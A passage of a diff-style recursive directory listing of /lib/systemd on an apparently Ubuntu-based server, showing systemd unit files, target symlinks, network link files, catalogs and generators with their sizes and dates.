+-rw-r--r-- 1 root root  242 Mar 24  2021 apport-autoreport.service
+-rw-r--r-- 1 root root  142 Mar 24  2021 apport-forward@.service
+-rw-r--r-- 1 root root  246 Mar 24  2021 apport-forward.socket
+-rw-r--r-- 1 root root  380 Mar 23  2021 blk-availability.service
+-rw-r--r-- 1 root root  341 Mar 23  2021 dm-event.service
+-rw-r--r-- 1 root root  248 Mar 23  2021 dm-event.socket
+-rw-r--r-- 1 root root  323 Mar 23  2021 lvm2-lvmpolld.service
+-rw-r--r-- 1 root root  239 Mar 23  2021 lvm2-lvmpolld.socket
+-rw-r--r-- 1 root root  602 Mar 23  2021 lvm2-monitor.service
+-rw-r--r-- 1 root root  338 Mar 23  2021 lvm2-pvscan@.service
+lrwxrwxrwx 1 root root    9 Mar 23  2021 lvm2.service -> /dev/null
+-rw-r--r-- 1 root root  418 Mar 22  2021 cloud-config.service
+-rw-r--r-- 1 root root  482 Mar 22  2021 cloud-final.service
+-rw-r--r-- 1 root root  608 Mar 22  2021 cloud-init-local.service
+-rw-r--r-- 1 root root  665 Mar 22  2021 cloud-init.service
+-rw-r--r-- 1 root root  536 Mar 19  2021 cloud-config.target
+-rw-r--r-- 1 root root  256 Mar 19  2021 cloud-init.target
+-rw-r--r-- 1 root root  319 Mar 15  2021 cron.service
+-rw-r--r-- 1 root root  807 Mar  4  2021 multipathd.service
+-rw-r--r-- 1 root root  186 Mar  4  2021 multipathd.socket
+lrwxrwxrwx 1 root root    9 Mar  4  2021 multipath-tools-boot.service -> /dev/null
+lrwxrwxrwx 1 root root   18 Mar  4  2021 multipath-tools.service -> multipathd.service
+-rw-r--r-- 1 root root  396 Mar  2  2021 finalrd.service
+-rw-r--r-- 1 root root  498 Feb 26  2021 dbus.service
+-rw-r--r-- 1 root root  206 Feb 26  2021 dbus.socket
+-rw-r--r-- 1 root root  477 Feb 26  2021 fstrim.service
+-rw-r--r-- 1 root root  229 Feb 26  2021 fstrim.timer
+-rw-r--r-- 1 root root  538 Feb 26  2021 uuidd.service
+-rw-r--r-- 1 root root  126 Feb 26  2021 uuidd.socket
+-rw-r--r-- 1 root root  508 Feb 25  2021 mdadm-grow-continue@.service
+-rw-r--r-- 1 root root  237 Feb 25  2021 mdadm-last-resort@.service
+-rw-r--r-- 1 root root  179 Feb 25  2021 mdadm-last-resort@.timer
+-rw-r--r-- 1 root root  559 Feb 25  2021 mdcheck_continue.service
+-rw-r--r-- 1 root root  436 Feb 25  2021 mdcheck_continue.timer
+-rw-r--r-- 1 root root  510 Feb 25  2021 mdcheck_start.service
+-rw-r--r-- 1 root root  463 Feb 25  2021 mdcheck_start.timer
+-rw-r--r-- 1 root root  490 Feb 25  2021 mdmonitor-oneshot.service
+-rw-r--r-- 1 root root  433 Feb 25  2021 mdmonitor-oneshot.timer
+-rw-r--r-- 1 root root  415 Feb 25  2021 mdmonitor.service
+-rw-r--r-- 1 root root 1.1K Feb 25  2021 mdmon@.service
+-rw-r--r-- 1 root root  409 Feb 24  2021 dmesg.service
+-rw-r--r-- 1 root root  469 Feb 24  2021 rsyslog.service
+-rw-r--r-- 1 root root  376 Feb 22  2021 xfs_scrub_all.service
+-rw-r--r-- 1 root root  250 Feb 22  2021 xfs_scrub_all.timer
+-rw-r--r-- 1 root root  272 Feb 22  2021 xfs_scrub_fail@.service
+-rw-r--r-- 1 root root  541 Feb 22  2021 xfs_scrub@.service
+-rw-r--r-- 1 root root  297 Feb 22  2021 e2scrub_all.service
+-rw-r--r-- 1 root root  251 Feb 22  2021 e2scrub_all.timer
+-rw-r--r-- 1 root root  245 Feb 22  2021 e2scrub_fail@.service
+-rw-r--r-- 1 root root  550 Feb 22  2021 e2scrub_reap.service
+-rw-r--r-- 1 root root  438 Feb 22  2021 e2scrub@.service
+-rw-r--r-- 1 root root  323 Feb 19  2021 ua-reboot-cmds.service
+-rw-r--r-- 1 root root  377 Feb 19  2021 unattended-upgrades.service
+-rw-r--r-- 1 root root  482 Feb 19  2021 man-db.service
+-rw-r--r-- 1 root root  164 Feb 19  2021 man-db.timer
+-rw-r--r-- 1 root root  312 Feb 19  2021 console-setup.service
+-rw-r--r-- 1 root root  287 Feb 19  2021 keyboard-setup.service
+lrwxrwxrwx 1 root root    9 Feb 18  2021 sudo.service -> /dev/null
+-rw-r--r-- 1 root root  207 Feb 16  2021 udisks2.service
+-rw-r--r-- 1 root root  404 Feb  9  2021 pollinate.service
+-rw-r--r-- 1 root root  167 Feb  4  2021 polkit.service
+-rw-r--r-- 1 root root  240 Feb  2  2021 update-notifier-download.service
+-rw-r--r-- 1 root root  268 Feb  2  2021 update-notifier-download.timer
+-rw-r--r-- 1 root root  251 Feb  2  2021 update-notifier-motd.service
+-rw-r--r-- 1 root root  301 Feb  2  2021 update-notifier-motd.timer
+-rw-r--r-- 1 root root  927 Feb  2  2021 basic.target
+-rw-r--r-- 1 root root  449 Feb  2  2021 blockdev@.target
+-rw-r--r-- 1 root root  427 Feb  2  2021 bluetooth.target
+-rw-r--r-- 1 root root  463 Feb  2  2021 boot-complete.target
+-rw-r--r-- 1 root root  473 Feb  2  2021 cryptsetup-pre.target
+-rw-r--r-- 1 root root  420 Feb  2  2021 cryptsetup.target
+-rw-r--r-- 1 root root  758 Feb  2  2021 dev-hugepages.mount
+-rw-r--r-- 1 root root  701 Feb  2  2021 dev-mqueue.mount
+-rw-r--r-- 1 root root  479 Feb  2  2021 emergency.target
+-rw-r--r-- 1 root root  549 Feb  2  2021 exit.target
+-rw-r--r-- 1 root root  488 Feb  2  2021 final.target
+-rw-r--r-- 1 root root  461 Feb  2  2021 first-boot-complete.target
+-rw-r--r-- 1 root root  514 Feb  2  2021 getty-pre.target
+-rw-r--r-- 1 root root  508 Feb  2  2021 getty.target
+-rw-r--r-- 1 root root  606 Feb  2  2021 graphical.target
+-rw-r--r-- 1 root root  535 Feb  2  2021 halt.target
+-rw-r--r-- 1 root root  517 Feb  2  2021 hibernate.target
+-rw-r--r-- 1 root root  538 Feb  2  2021 hybrid-sleep.target
+-rw-r--r-- 1 root root  670 Feb  2  2021 initrd-cleanup.service
+-rw-r--r-- 1 root root  598 Feb  2  2021 initrd-fs.target
+-rw-r--r-- 1 root root  820 Feb  2  2021 initrd-parse-etc.service
+-rw-r--r-- 1 root root  566 Feb  2  2021 initrd-root-device.target
+-rw-r--r-- 1 root root  571 Feb  2  2021 initrd-root-fs.target
+-rw-r--r-- 1 root root  589 Feb  2  2021 initrd-switch-root.service
+-rw-r--r-- 1 root root  779 Feb  2  2021 initrd-switch-root.target
+-rw-r--r-- 1 root root  768 Feb  2  2021 initrd.target
+-rw-r--r-- 1 root root  823 Feb  2  2021 initrd-udevadm-cleanup-db.service
+-rw-r--r-- 1 root root  549 Feb  2  2021 kexec.target
+-rw-r--r-- 1 root root  443 Feb  2  2021 local-fs-pre.target
+-rw-r--r-- 1 root root  555 Feb  2  2021 local-fs.target
+-rw-r--r-- 1 root root  453 Feb  2  2021 machine.slice
+-rw-r--r-- 1 root root  549 Feb  2  2021 modprobe@.service
+-rw-r--r-- 1 root root  540 Feb  2  2021 multi-user.target
+-rw-r--r-- 1 root root  513 Feb  2  2021 network-online.target
+-rw-r--r-- 1 root root  510 Feb  2  2021 network-pre.target
+-rw-r--r-- 1 root root  529 Feb  2  2021 network.target
+-rw-r--r-- 1 root root  562 Feb  2  2021 nss-lookup.target
+-rw-r--r-- 1 root root  521 Feb  2  2021 nss-user-lookup.target
+-rw-r--r-- 1 root root  402 Feb  2  2021 paths.target
+-rw-r--r-- 1 root root  600 Feb  2  2021 poweroff.target
+-rw-r--r-- 1 root root  425 Feb  2  2021 printer.target
+-rw-r--r-- 1 root root  753 Feb  2  2021 proc-sys-fs-binfmt_misc.automount
+-rw-r--r-- 1 root root  726 Feb  2  2021 proc-sys-fs-binfmt_misc.mount
+-rw-r--r-- 1 root root  591 Feb  2  2021 reboot.target
+-rw-r--r-- 1 root root  557 Feb  2  2021 remote-cryptsetup.target
+-rw-r--r-- 1 root root  444 Feb  2  2021 remote-fs-pre.target
+-rw-r--r-- 1 root root  530 Feb  2  2021 remote-fs.target
+-rw-r--r-- 1 root root  500 Feb  2  2021 rescue.target
+-rw-r--r-- 1 root root  548 Feb  2  2021 rpcbind.target
+-rw-r--r-- 1 root root  450 Feb  2  2021 shutdown.target
+-rw-r--r-- 1 root root  410 Feb  2  2021 sigpwr.target
+-rw-r--r-- 1 root root  468 Feb  2  2021 sleep.target
+-rw-r--r-- 1 root root  457 Feb  2  2021 slices.target
+-rw-r--r-- 1 root root  428 Feb  2  2021 smartcard.target
+-rw-r--r-- 1 root root  404 Feb  2  2021 sockets.target
+-rw-r--r-- 1 root root  428 Feb  2  2021 sound.target
+-rw-r--r-- 1 root root  511 Feb  2  2021 suspend.target
+-rw-r--r-- 1 root root  585 Feb  2  2021 suspend-then-hibernate.target
+-rw-r--r-- 1 root root  401 Feb  2  2021 swap.target
+-rw-r--r-- 1 root root 1.2K Feb  2  2021 sys-fs-fuse-connections.mount
+-rw-r--r-- 1 root root  566 Feb  2  2021 sysinit.target
+-rw-r--r-- 1 root root  746 Feb  2  2021 sys-kernel-debug.mount
+-rw-r--r-- 1 root root  772 Feb  2  2021 sys-kernel-tracing.mount
+-rw-r--r-- 1 root root 1.4K Feb  2  2021 syslog.socket
+-rw-r--r-- 1 root root  730 Feb  2  2021 systemd-ask-password-console.path
+-rw-r--r-- 1 root root  745 Feb  2  2021 systemd-ask-password-console.service
+-rw-r--r-- 1 root root  658 Feb  2  2021 systemd-ask-password-wall.path
+-rw-r--r-- 1 root root  750 Feb  2  2021 systemd-ask-password-wall.service
+-rw-r--r-- 1 root root 1.4K Feb  2  2021 systemd-boot-system-token.service
+-rw-r--r-- 1 root root  564 Feb  2  2021 systemd-exit.service
+-rw-r--r-- 1 root root  587 Feb  2  2021 systemd-halt.service
+-rw-r--r-- 1 root root  554 Feb  2  2021 systemd-initctl.socket
+-rw-r--r-- 1 root root 1.2K Feb  2  2021 systemd-journald-dev-log.socket
+-rw-r--r-- 1 root root  906 Feb  2  2021 systemd-journald.socket
+-rw-r--r-- 1 root root  746 Feb  2  2021 systemd-journald@.socket
+-rw-r--r-- 1 root root  605 Feb  2  2021 systemd-journald-varlink@.socket
+-rw-r--r-- 1 root root  781 Feb  2  2021 systemd-journal-flush.service
+-rw-r--r-- 1 root root  600 Feb  2  2021 systemd-kexec.service
+-rw-r--r-- 1 root root  748 Feb  2  2021 systemd-machine-id-commit.service
+-rw-r--r-- 1 root root  640 Feb  2  2021 systemd-networkd.socket
+-rw-r--r-- 1 root root  564 Feb  2  2021 systemd-poweroff.service
+-rw-r--r-- 1 root root  559 Feb  2  2021 systemd-reboot.service
+-rw-r--r-- 1 root root  734 Feb  2  2021 systemd-rfkill.socket
+-rw-r--r-- 1 root root  703 Feb  2  2021 systemd-sysusers.service
+-rw-r--r-- 1 root root  666 Feb  2  2021 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  498 Feb  2  2021 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  747 Feb  2  2021 systemd-tmpfiles-setup-dev.service
+-rw-r--r-- 1 root root  787 Feb  2  2021 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  643 Feb  2  2021 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  618 Feb  2  2021 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  863 Feb  2  2021 systemd-udev-settle.service
+-rw-r--r-- 1 root root  442 Feb  2  2021 system-systemd-cryptsetup.slice
+-rw-r--r-- 1 root root 1.4K Feb  2  2021 system-update-cleanup.service
+-rw-r--r-- 1 root root  551 Feb  2  2021 system-update-pre.target
+-rw-r--r-- 1 root root  625 Feb  2  2021 system-update.target
+-rw-r--r-- 1 root root  453 Feb  2  2021 timers.target
+-rw-r--r-- 1 root root  434 Feb  2  2021 time-set.target
+-rw-r--r-- 1 root root  487 Feb  2  2021 time-sync.target
+-rw-r--r-- 1 root root  465 Feb  2  2021 umount.target
+-rw-r--r-- 1 root root  426 Feb  2  2021 usb-gadget.target
+-rw-r--r-- 1 root root  440 Feb  2  2021 user.slice
+-rw-r--r-- 1 root root  419 Jan 20  2021 apache2.service
+-rw-r--r-- 1 root root  491 Jan 20  2021 apache2@.service
+-rw-r--r-- 1 root root  603 Jan 20  2021 apache-htcacheclean.service
+-rw-r--r-- 1 root root  612 Jan 20  2021 apache-htcacheclean@.service
+-rw-r--r-- 1 root root  987 Jan 19  2021 open-iscsi.service
+-rw-r--r-- 1 root root  463 Jan 19  2021 iscsid.service
+-rw-r--r-- 1 root root  642 Jan 15  2021 bolt.service
+-rw-r--r-- 1 root root  400 Dec 23  2020 packagekit-offline-update.service
+-rw-r--r-- 1 root root  364 Dec 23  2020 packagekit.service
+-rw-r--r-- 1 root root  175 Dec 18  2020 iscsid.socket
+-rw-r--r-- 1 root root  155 Nov 18  2020 phpsessionclean.service
+-rw-r--r-- 1 root root  144 Nov 18  2020 phpsessionclean.timer
+-rw-r--r-- 1 root root  258 Nov 10  2020 networkd-dispatcher.service
+-rw-r--r-- 1 root root  489 Oct 26  2020 open-vm-tools.service
+-rw-r--r-- 1 root root  408 Oct 26  2020 vgauth.service
+-rw-r--r-- 1 root root  467 Oct 26  2020 plymouth-halt.service
+-rw-r--r-- 1 root root  481 Oct 26  2020 plymouth-kexec.service
+lrwxrwxrwx 1 root root   27 Oct 26  2020 plymouth-log.service -> plymouth-read-write.service
+-rw-r--r-- 1 root root  476 Oct 26  2020 plymouth-poweroff.service
+-rw-r--r-- 1 root root  214 Oct 26  2020 plymouth-quit.service
+-rw-r--r-- 1 root root  220 Oct 26  2020 plymouth-quit-wait.service
+-rw-r--r-- 1 root root  264 Oct 26  2020 plymouth-read-write.service
+-rw-r--r-- 1 root root  469 Oct 26  2020 plymouth-reboot.service
+lrwxrwxrwx 1 root root   21 Oct 26  2020 plymouth.service -> plymouth-quit.service
+-rw-r--r-- 1 root root  587 Oct 26  2020 plymouth-start.service
+-rw-r--r-- 1 root root  311 Oct 26  2020 plymouth-switch-root.service
+-rw-r--r-- 1 root root  525 Oct 26  2020 systemd-ask-password-plymouth.path
+-rw-r--r-- 1 root root  502 Oct 26  2020 systemd-ask-password-plymouth.service
+-rw-r--r-- 1 root root 1.2K Oct  6  2020 apparmor.service
+-rw-r--r-- 1 root root  505 Sep  2  2020 irqbalance.service
+-rw-r--r-- 1 root root  735 Aug 26  2020 secureboot-db.service
+-rw-r--r-- 1 root root  870 Aug 21  2020 logrotate.service
+-rw-r--r-- 1 root root 1011 Jul  1  2020 rsync.service
+-rw-r--r-- 1 root root  171 Jun 23  2020 usbmuxd.service
+-rw-r--r-- 1 root root  173 Jun 15  2020 motd-news.service
+-rw-r--r-- 1 root root  161 Jun 15  2020 motd-news.timer
+-rw-r--r-- 1 root root  994 May 16  2020 upower.service
+-rw-r--r-- 1 root root  216 May  8  2020 ssh.socket
+-rw-r--r-- 1 root root  498 Apr  1  2020 lxd-agent.service
+-rw-r--r-- 1 root root  489 Apr  1  2020 lxd-agent-9p.service
+-rw-r--r-- 1 root root  266 Jan 21  2020 ufw.service
+-rw-r--r-- 1 root root  330 Nov 27  2019 setvtrgb.service
+-rw-r--r-- 1 root root  191 Oct 14  2019 logrotate.timer
+-rw-r--r-- 1 root root  618 Oct  2  2018 friendly-recovery.service
+-rw-r--r-- 1 root root  172 Oct  2  2018 friendly-recovery.target
+
+/lib/systemd/system/mariadb@bootstrap.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 676 Aug  3 08:29 use_galera_new_cluster.conf
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Jul 20 11:38 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx 1 root root 32 Jul 20 11:38 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
+lrwxrwxrwx 1 root root 34 Jul 20 11:38 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
+lrwxrwxrwx 1 root root 26 Jul 20 11:38 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx 1 root root 31 Jul 20 11:38 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Jul 20 11:38 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx 1 root root 14 Feb 26  2021 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 20 Jul 20 11:38 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx 1 root root 22 Jul 20 11:38 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx 1 root root 19 Jul 20 11:38 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx 1 root root 28 Jul 20 11:38 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx 1 root root 36 Jul 20 11:38 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx 1 root root 32 Jul 20 11:38 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx 1 root root 26 Jul 20 11:38 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx 1 root root 25 Jul 20 11:38 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx 1 root root 27 Jul 20 11:38 sys-kernel-tracing.mount -> ../sys-kernel-tracing.mount
+lrwxrwxrwx 1 root root 36 Jul 20 11:38 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx 1 root root 25 Jul 20 11:38 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx 1 root root 36 Jul 20 11:38 systemd-boot-system-token.service -> ../systemd-boot-system-token.service
+lrwxrwxrwx 1 root root 30 Jul 20 11:38 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx 1 root root 27 Jul 20 11:38 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx 1 root root 32 Jul 20 11:38 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx 1 root root 36 Jul 20 11:38 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx 1 root root 31 Jul 20 11:38 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx 1 root root 30 Jul 20 11:38 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx 1 root root 25 Jul 20 11:38 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx 1 root root 27 Jul 20 11:38 systemd-sysusers.service -> ../systemd-sysusers.service
+lrwxrwxrwx 1 root root 37 Jul 20 11:38 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx 1 root root 33 Jul 20 11:38 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx 1 root root 24 Jul 20 11:38 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 31 Jul 20 11:38 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+lrwxrwxrwx 1 root root 30 Jul 20 11:38 systemd-update-utmp.service -> ../systemd-update-utmp.service
+lrwxrwxrwx 1 root root 30 Oct 26  2020 plymouth-read-write.service -> ../plymouth-read-write.service
+lrwxrwxrwx 1 root root 25 Oct 26  2020 plymouth-start.service -> ../plymouth-start.service
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Jul 20 11:38 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul 20 11:38 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/initrd-root-device.target.wants:
+total 0
+lrwxrwxrwx 1 root root 27 Jul 20 11:38 remote-cryptsetup.target -> ../remote-cryptsetup.target
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Jul 20 11:38 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Jul 20 11:38 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Jul 20 11:38 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Jul 20 11:38 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Jul 20 11:38 systemd-user-sessions.service -> ../systemd-user-sessions.service
+lrwxrwxrwx 1 root root 15 Feb 26  2021 dbus.service -> ../dbus.service
+lrwxrwxrwx 1 root root 24 Oct 26  2020 plymouth-quit.service -> ../plymouth-quit.service
+lrwxrwxrwx 1 root root 29 Oct 26  2020 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul 20 11:38 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Jul 20 11:38 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/rc-local.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 290 Jul  6 13:21 debian.conf
+
+/lib/systemd/system/systemd-localed.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 220 Jul  6 13:21 locale-gen.conf
+
+/lib/systemd/system/user@.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 125 Jul  6 13:21 timeout.conf
+
+/lib/systemd/system/user-.slice.d:
+total 4.0K
+-rw-r--r-- 1 root root 494 Feb  2  2021 10-defaults.conf
+
+/lib/systemd/system/system-update.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Mar 26  2021 fwupd-offline-update.service -> ../fwupd-offline-update.service
+lrwxrwxrwx 1 root root 36 Dec 23  2020 packagekit-offline-update.service -> ../packagekit-offline-update.service
+
+/lib/systemd/system/halt.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 Oct 26  2020 plymouth-halt.service -> ../plymouth-halt.service
+
+/lib/systemd/system/initrd-switch-root.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Oct 26  2020 plymouth-start.service -> ../plymouth-start.service
+lrwxrwxrwx 1 root root 31 Oct 26  2020 plymouth-switch-root.service -> ../plymouth-switch-root.service
+
+/lib/systemd/system/kexec.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Oct 26  2020 plymouth-kexec.service -> ../plymouth-kexec.service
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx 1 root root 28 Oct 26  2020 plymouth-poweroff.service -> ../plymouth-poweroff.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx 1 root root 26 Oct 26  2020 plymouth-reboot.service -> ../plymouth-reboot.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+
+/lib/systemd/network:
+total 36K
+-rw-r--r-- 1 root root  44 Jul  6 13:21 73-usb-net-by-mac.link
+-rw-r--r-- 1 root root 653 Feb  2  2021 80-container-host0.network
+-rw-r--r-- 1 root root 726 Feb  2  2021 80-container-ve.network
+-rw-r--r-- 1 root root 712 Feb  2  2021 80-container-vz.network
+-rw-r--r-- 1 root root 680 Feb  2  2021 80-vm-vt.network
+-rw-r--r-- 1 root root  78 Feb  2  2021 80-wifi-adhoc.network
+-rw-r--r-- 1 root root 101 Feb  2  2021 80-wifi-ap.network.example
+-rw-r--r-- 1 root root  64 Feb  2  2021 80-wifi-station.network.example
+-rw-r--r-- 1 root root 499 Feb  2  2021 99-default.link
+
+/lib/systemd/catalog:
+total 168K
+-rw-r--r-- 1 root root  13K Jul 20 11:38 systemd.be.catalog
+-rw-r--r-- 1 root root 9.6K Jul 20 11:38 systemd.be@latin.catalog
+-rw-r--r-- 1 root root  14K Jul 20 11:38 systemd.bg.catalog
+-rw-r--r-- 1 root root  19K Jul 20 11:38 systemd.catalog
+-rw-r--r-- 1 root root  480 Jul 20 11:38 systemd.de.catalog
+-rw-r--r-- 1 root root  13K Jul 20 11:38 systemd.fr.catalog
+-rw-r--r-- 1 root root  16K Jul 20 11:38 systemd.it.catalog
+-rw-r--r-- 1 root root  21K Jul 20 11:38 systemd.pl.catalog
+-rw-r--r-- 1 root root 8.0K Jul 20 11:38 systemd.pt_BR.catalog
+-rw-r--r-- 1 root root  20K Jul 20 11:38 systemd.ru.catalog
+-rw-r--r-- 1 root root 7.0K Jul 20 11:38 systemd.zh_CN.catalog
+-rw-r--r-- 1 root root 6.9K Jul 20 11:38 systemd.zh_TW.catalog
+
+/lib/systemd/user:
+total 140K
+drwxr-xr-x 2 root root 4.0K Nov  9 03:14 graphical-session-pre.target.wants
+-rw-r--r-- 1 root root  287 Jul 28 13:33 ssh-agent.service
+-rw-r--r-- 1 root root  554 Jul 20 11:38 graphical-session-pre.target
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 sockets.target.wants
+-rw-r--r-- 1 root root  141 Mar 30  2021 snapd.session-agent.service
+-rw-r--r-- 1 root root  152 Mar 30  2021 snapd.session-agent.socket
+-rw-r--r-- 1 root root  231 Feb 22  2021 dirmngr.service
+-rw-r--r-- 1 root root  419 Feb  2  2021 app.slice
+-rw-r--r-- 1 root root  424 Feb  2  2021 background.slice
+-rw-r--r-- 1 root root  505 Feb  2  2021 basic.target
+-rw-r--r-- 1 root root  427 Feb  2  2021 bluetooth.target
+-rw-r--r-- 1 root root  471 Feb  2  2021 default.target
+-rw-r--r-- 1 root root  510 Feb  2  2021 exit.target
+-rw-r--r-- 1 root root  492 Feb  2  2021 graphical-session.target
+-rw-r--r-- 1 root root  402 Feb  2  2021 paths.target
+-rw-r--r-- 1 root root  425 Feb  2  2021 printer.target
+-rw-r--r-- 1 root root  420 Feb  2  2021 session.slice
+-rw-r--r-- 1 root root  450 Feb  2  2021 shutdown.target
+-rw-r--r-- 1 root root  428 Feb  2  2021 smartcard.target
+-rw-r--r-- 1 root root  404 Feb  2  2021 sockets.target
+-rw-r--r-- 1 root root  428 Feb  2  2021 sound.target
+-rw-r--r-- 1 root root  598 Feb  2  2021 systemd-exit.service
+-rw-r--r-- 1 root root  688 Feb  2  2021 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  541 Feb  2  2021 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  728 Feb  2  2021 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  453 Feb  2  2021 timers.target
+-rw-r--r-- 1 root root  477 Feb  2  2021 xdg-desktop-autostart.target
+-rw-r--r-- 1 root root  158 Dec 23  2020 pk-debconf-helper.service
+-rw-r--r-- 1 root root  127 Dec 23  2020 pk-debconf-helper.socket
+-rw-r--r-- 1 root root  204 Aug 28  2017 dirmngr.socket
+-rw-r--r-- 1 root root  298 Aug 28  2017 gpg-agent-browser.socket
+-rw-r--r-- 1 root root  281 Aug 28  2017 gpg-agent-extra.socket
+-rw-r--r-- 1 root root  223 Aug 28  2017 gpg-agent.service
+-rw-r--r-- 1 root root  234 Aug 28  2017 gpg-agent.socket
+-rw-r--r-- 1 root root  308 Aug 28  2017 gpg-agent-ssh.socket
+
+/lib/systemd/user/graphical-session-pre.target.wants:
+total 0
+lrwxrwxrwx 1 root root 20 Jul 28 13:33 ssh-agent.service -> ../ssh-agent.service
+
+/lib/systemd/user/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Mar 30  2021 snapd.session-agent.socket -> ../snapd.session-agent.socket
+
+/lib/systemd/user-environment-generators:
+total 20K
+-rwxr-xr-x 1 root root 15K Jul 20 11:38 30-systemd-environment-d-generator
+-rw-r--r-- 1 root root 851 Jan 16  2021 90gpg-agent
+
+/lib/systemd/user-generators:
+total 32K
+-rwxr-xr-x 1 root root 31K Jul 20 11:38 systemd-xdg-autostart-generator
+
+/lib/systemd/user-preset:
+total 4.0K
+-rw-r--r-- 1 root root 580 Feb  2  2021 90-systemd.preset
+
+/lib/systemd/system-generators:
+total 468K
+-rwxr-xr-x 1 root root  15K Jul 20 11:38 systemd-bless-boot-generator
+-rwxr-xr-x 1 root root  35K Jul 20 11:38 systemd-cryptsetup-generator
+-rwxr-xr-x 1 root root  15K Jul 20 11:38 systemd-debug-generator
+-rwxr-xr-x 1 root root  43K Jul 20 11:38 systemd-fstab-generator
+-rwxr-xr-x 1 root root  19K Jul 20 11:38 systemd-getty-generator
+-rwxr-xr-x 1 root root  35K Jul 20 11:38 systemd-gpt-auto-generator
+-rwxr-xr-x 1 root root  15K Jul 20 11:38 systemd-hibernate-resume-generator
+-rwxr-xr-x 1 root root  15K Jul 20 11:38 systemd-rc-local-generator
+-rwxr-xr-x 1 root root  15K Jul 20 11:38 systemd-run-generator
+-rwxr-xr-x 1 root root  15K Jul 20 11:38 systemd-system-update-generator
+-rwxr-xr-x 1 root root  35K Jul 20 11:38 systemd-sysv-generator
+-rwxr-xr-x 1 root root  19K Jul 20 11:38 systemd-veritysetup-generator
+lrwxrwxrwx 1 root root   22 Apr 14  2021 netplan -> ../../netplan/generate
+-rwxr-xr-x 1 root root  19K Mar 30  2021 snapd-generator
+-rwxr-xr-x 1 root root 148K Mar 23  2021 lvm2-activation-generator
